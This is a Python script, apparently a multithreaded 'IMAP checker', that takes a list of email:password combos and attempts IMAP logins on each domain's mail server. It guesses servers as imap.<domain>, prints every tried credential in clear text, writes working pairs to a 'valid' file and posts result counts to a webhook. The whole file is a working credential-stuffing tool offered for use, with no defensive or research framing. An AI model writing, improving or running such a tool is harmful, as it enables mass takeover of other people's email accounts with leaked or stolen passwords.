import imaplib
import threading
import queue
import json
import curses
import time
import requests
from raducord import Logger
from collections import Counter

def load_settings(filename, autodelete):
    settings = {}
    with open(filename, 'r', encoding='utf-8', errors='ignore' if autodelete else 'strict') as f:
        lines = f.readlines()
    valid_lines = []
    for line in lines:
        parts = line.strip().split(':')
        if len(parts) == 3:
            domain, server, port = parts
            settings[domain] = (server, port)
            valid_lines.append(line)
    if autodelete:
        with open(filename, 'w', encoding='utf-8') as f:
            f.writelines(valid_lines)
    return settings

def load_list(filename, autodelete):
    items = []
    with open(filename, 'r', encoding='utf-8', errors='ignore' if autodelete else 'strict') as f:
        lines = f.readlines()
    valid_lines = []
    for line in lines:
        items.append(line.strip())
        valid_lines.append(line)
    if autodelete:
        with open(filename, 'w', encoding='utf-8') as f:
            f.writelines(valid_lines)
    return items

def remove_duplicates(combos):
    combo_count = Counter(combos)
    duplicates = len(combos) - len(combo_count)
    unique_combos = list(combo_count.keys())
    return unique_combos, duplicates

def load_config(filename='config.json'):
    with open(filename, 'r') as f:
        return json.load(f)

def save_settings(settings, filename):
    with open(filename, 'w') as f:
        for domain, (server, port) in settings.items():
            f.write(f"{domain}:{server}:{port}\n")

def auto_detect_server(domain, retries, retry_delay):
    server = f'imap.{domain}'
    port = 993
    for _ in range(retries):
        try:
            mail = imaplib.IMAP4_SSL(server, port)
            return server, port
        except:
            time.sleep(retry_delay)
    return None, None

def check_email(combo, settings, valid_count, invalid_count, error_count, lock, config):
    email, password = combo.split(':')
    domain = email.split('@')[-1]
    
    if domain not in settings:
        server, port = auto_detect_server(domain, config['retries'], config['retry_delay'])
        if server and port:
            settings[domain] = (server, port)
            save_settings(settings, config['imap_file'])
        else:
            Logger.failed(f"{email},{password},INVALID")
            with lock:
                invalid_count[0] += 1
            return
    
    server, port = settings[domain]
    try:
        mail = imaplib.IMAP4_SSL(server, port)
        mail.login(email, password)
        Logger.success(f"{email},{password},VALID")
        with open(config['valid_file'], 'a') as f:
            f.write(f"{email}:{password}\n")
        with lock:
            valid_count[0] += 1
    except:
        Logger.failed(f"{email},{password},INVALID")
        with lock:
            invalid_count[0] += 1

def worker(settings, combos, valid_count, invalid_count, error_count, lock, config):
    while not combos.empty():
        combo = combos.get()
        try:
            check_email(combo, settings, valid_count, invalid_count, error_count, lock, config)
        except Exception as e:
            Logger.error(f"Error processing combo {combo}: {e}")
            with lock:
                error_count[0] += 1
        finally:
            combos.task_done()

def display_cui(stdscr, valid_count, invalid_count, error_count):
    curses.curs_set(0)
    curses.start_color()
    curses.init_pair(1, curses.COLOR_GREEN, curses.COLOR_BLACK)
    curses.init_pair(2, curses.COLOR_RED, curses.COLOR_BLACK)
    curses.init_pair(3, curses.COLOR_YELLOW, curses.COLOR_BLACK)
    while True:
        stdscr.clear()
        stdscr.addstr(0, 0, f"[Valid : {valid_count[0]}]", curses.color_pair(1))
        stdscr.addstr(1, 0, f"[Invalid : {invalid_count[0]}]", curses.color_pair(2))
        stdscr.addstr(2, 0, f"[Errors : {error_count[0]}]", curses.color_pair(3))
        stdscr.refresh()
        curses.napms(500)

def send_webhook_notification(url, valid_count, invalid_count, error_count, valid_file):
    headers = {
        "Content-Type": "application/json"
    }

    embed = {
        "title": "IMAP Checker Results",
        "color": 65280,  # Green color
        "fields": [
            {"name": "Valid", "value": f"```{valid_count}```", "inline": True},
            {"name": "Invalid", "value": f"```{invalid_count}```", "inline": True},
            {"name": "Errors", "value": f"```{error_count}```", "inline": True}
        ]
    }

    data = {
        "embeds": [embed]
    }

    response = requests.post(url, headers=headers, json=data)
    if response.status_code == 204:
        print("Webhook sent successfully.")
    else:
        print(f"Failed to send webhook: {response.status_code}")

def main():
    config = load_config()
    
    settings = load_settings(config['imap_file'], config['autodelete'])
    combos = load_list(config['combo_file'], config['autodelete'])
    
    unique_combos, duplicates = remove_duplicates(combos)
    combo_queue = queue.Queue()
    for combo in unique_combos:
        combo_queue.put(combo)
    
    print(f"Removed {duplicates} duplicates. Starting in 5 seconds...")
    time.sleep(5)

    valid_count = [0]
    invalid_count = [0]
    error_count = [0]
    lock = threading.Lock()

    threads = []
    for _ in range(config['threads']):
        thread = threading.Thread(target=worker, args=(settings, combo_queue, valid_count, invalid_count, error_count, lock, config))
        thread.start()
        threads.append(thread)

    if config['cui']:
        curses.wrapper(display_cui, valid_count, invalid_count, error_count)
    else:
        for thread in threads:
            thread.join()

    if config['summary']:
        print(f"\nSummary Report:\nValid: {valid_count[0]}\nInvalid: {invalid_count[0]}\nErrors: {error_count[0]}")

    if config['webhook_url']:
        send_webhook_notification(config['webhook_url'], valid_count[0], invalid_count[0], error_count[0], config['valid_file'])

if __name__ == '__main__':
    main()
